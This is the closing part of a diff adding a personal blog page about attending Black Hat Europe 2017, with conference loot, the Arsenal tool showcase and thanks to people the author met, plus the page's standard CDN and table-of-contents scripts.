+</ul>
+
+<p>w00t \o/</p>
+
+<p>Here is a picture of my loot:</p>
+
+<p><img src="/img/bheu2017/loot.jpg" alt="" /></p>
+
+<h2 id="others-briefing">Others briefing</h2>
+
+<h2 id="arsenal">Arsenal</h2>
+
+<p>The Arsenal was little presentation stand and people introduced their tools.</p>
+
+<p>All tools are available on that GitHub: <a href="https://github.com/toolswatch/blackhat-arsenal-tools">https://github.com/toolswatch/blackhat-arsenal-tools</a></p>
+
+<p><strong>From a personal point of view</strong> Arsenal is really great to make known people, I think I will try in BH 2018 with <em>Auto-Vol</em>! :-D</p>
+
+<h2 id="conclusion">Conclusion</h2>
+
+<p>I think it’s my best event at this time! Briefings were crazy, arsenal tools were crazy too and there was a lot of goodies!</p>
+
+<p>I also met nice people, such as:</p>
+
+<ul>
+<li><a href="https://twitter.com/PaulWebSec">@PaulWebSec</a></li>
+<li><a href="https://twitter.com/lyon01_david">@lyon01_david</a></li>
+<li><a href="https://twitter.com/_Bytemare">@_Bytemare</a></li>
+<li><a href="https://twitter.com/_SaxX_">@<em>SaxX</em></a></li>
+</ul>
+
+<p>Feel free to contact me on Twitter or by email! See you soon :-D</p>
+
+<p>Thanks to Nicolas TERRIEN for his english skills! :D</p>
+
+<p><a href="https://maki.bzh/">Home</a></p>
+
+	</div>
+</article>
+
+		</div>
+		
+	
+<script src="https://use.fontawesome.com/releases/v5.2.0/js/all.js" integrity="sha256-l1iMQ6f0+8aFBzSNRxgklLlYMqu5S4b/LpaST2s+gog= sha384-4oV5EgaV02iISL2ban6c/RmotsABqE4yZxZLcYMAdG7FAPsyHYAPpywE9PJo+Khy sha512-3dlGoFoY39YEcetqKPULIqryjeClQkr2KXshhYxFXNZAgRFZElUW9UQmYkmQE1bvB8tssj3uSKDzsj8rA04Meg==" crossorigin="anonymous"></script>
+
+
+    
+        
+        
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw= sha384-ZeLYJ2PNSQjvogWP559CDAf02Qb8FE5OyQicqtz/+UhZutbrwyr87Be7NPH/RgyC sha512-ExaEi+x+Zqq50MIBraxsK23lQQJZd8Q7ZDlwJsxQwsWlO8XvRouQev9ZWaFxCKdTvrgb2fmf2pglwGp61/7qZA==" crossorigin="anonymous"></script>
+	
+        <script type="text/javascript">
+            hljs.configure({languages: []});
+            hljs.initHighlightingOnLoad();
+        </script>
+        
+        
+
+
+
+	
+
+
+	<script>
+    (function() {
+      var toc = document.getElementById('TableOfContents');
+      if (!toc) return;
+      do {
+        var li, ul = toc.querySelector('ul');
+        if (ul.childElementCount !== 1) break;
+        li = ul.firstElementChild;
+        if (li.tagName !== 'LI') break;
+        
+        ul.outerHTML = li.innerHTML;
+      } while (toc.childElementCount >= 1);
+    })();
+  </script>
+
+	</body>
+</html>
